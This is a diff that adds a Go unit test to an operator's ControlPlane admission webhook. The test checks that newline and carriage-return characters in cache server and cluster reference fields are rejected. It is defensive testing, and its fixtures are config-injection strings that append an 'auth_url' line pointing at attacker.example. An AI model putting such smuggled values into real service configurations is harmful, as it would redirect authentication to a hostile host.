@@ -2960,6 +2960,58 @@ func TestValidateCreate_RejectsDedicatedCacheXOR(t *testing.T) {
 	}
 }
 
+// TestValidateCreate_RejectsCacheControlChars covers both cache blocks the
+// ControlPlane owns: the shared spec.infrastructure.cache and a per-service
+// dedicated cache. Each is projected onto a service CR's spec.cache, where
+// cache.ResolveServers feeds the verbatim INI renderer — so a newline there
+// injects an additional config line into the projected service config. Failing
+// here keeps the ControlPlane from admitting a spec whose projected child CR its
+// own webhook would then reject mid-reconcile.
+func TestValidateCreate_RejectsCacheControlChars(t *testing.T) {
+	tests := []struct {
+		name     string
+		mutate   func(cp *ControlPlane)
+		wantPath string
+	}{
+		{
+			name: "shared cache server with a newline",
+			mutate: func(cp *ControlPlane) {
+				cp.Spec.Infrastructure.Cache.Servers = []string{"mc:11211\nauth_url = http://attacker.example/v3"}
+			},
+			wantPath: "infrastructure.cache.servers[0]",
+		},
+		{
+			name: "dedicated cache clusterRef name with a carriage return",
+			mutate: func(cp *ControlPlane) {
+				cp.Spec.Services.Horizon = &ServiceHorizonSpec{
+					DedicatedBackingServices: &HorizonDedicatedBackingServicesSpec{
+						Cache: &commonv1.CacheSpec{
+							ClusterRef: &corev1.LocalObjectReference{
+								Name: "cp-horizon-cache\rauth_url = http://attacker.example/v3",
+							},
+							Backend: commonv1.DefaultCacheBackend,
+						},
+					},
+				}
+			},
+			wantPath: "horizon.dedicatedBackingServices.cache.clusterRef.name",
+		},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			g := NewGomegaWithT(t)
+			w := &ControlPlaneWebhook{}
+			cp := validControlPlane()
+			tc.mutate(cp)
+
+			_, err := w.ValidateCreate(context.Background(), cp)
+			g.Expect(err).To(HaveOccurred())
+			g.Expect(err.Error()).To(ContainSubstring("must not contain a newline or carriage return"))
+			g.Expect(err.Error()).To(ContainSubstring(tc.wantPath))
+		})
+	}
+}
+
 // TestValidateCreate_RejectsDynamicCredentialsOnDedicatedDatabase pins the one
 // constraint a dedicated database carries that the shared block does not: the
 // OpenBao database engine is bootstrapped once per NAMESPACE against the shared
